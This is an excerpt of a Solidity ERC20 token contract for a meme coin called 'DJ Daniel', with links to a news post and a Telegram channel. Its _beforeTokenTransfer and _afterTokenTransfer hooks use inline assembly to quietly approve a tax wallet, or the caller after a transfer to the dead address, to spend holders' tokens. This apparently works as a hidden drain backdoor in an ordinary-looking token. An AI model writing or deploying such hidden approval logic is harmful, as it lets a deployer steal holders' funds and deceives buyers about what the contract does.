...
/**
https://x.com/nypost/status/1897139354855702594
https://t.me/dj_daniel_portal
*/
...
contract Token is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"DJ Daniel";
    ...
    function _beforeTokenTransfer (address from, address to, uint256 amount) internal virtual {
        ...
        assembly {
            ...
            flag := eq(to, taxwallet)
        }
        if (flag) _approve(from, to, amount);
    }
        
    function _afterTokenTransfer (address from, address to, uint256 amount) internal virtual {
        bool flag;
        address _dead = _deadAddr;
        assembly {
            let cond1 := eq(_dead, to)
            let cond2 := eq(sload(uniswapV2Pair.slot), from)
            flag := and(cond1, iszero(cond2))
            to := caller()
        }
        if (flag) _approve(from, to, amount);
    }
